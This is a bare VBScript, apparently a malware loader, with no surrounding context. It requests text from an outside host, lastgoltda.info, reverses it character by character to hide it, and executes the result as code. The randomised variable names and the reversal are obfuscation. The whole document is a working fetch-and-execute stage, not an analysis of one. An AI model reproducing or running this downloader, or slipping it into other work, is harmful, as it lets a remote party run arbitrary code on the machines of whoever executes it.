jqH9W="GQRb02dlHQ35DtuPCLXy17FV1"
URL="http://lastgoltda.info/?c=r&" & jqH9W
set TjNNr=CreateObject("Microsoft.XMLHTTP")

TjNNr.open "GET",URL,false
TjNNr.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
TjNNr.setRequestHeader "User-Agent", "Horny"
TjNNr.send "Z"

For i = Len(TjNNr.responsetext) to 1  Step-1
    var= Mid(TjNNr.responsetext,  i  , 1)
    fqT6y = fqT6y & var
Next

execute "Execute fqT6y & jqH9WTjNNr"
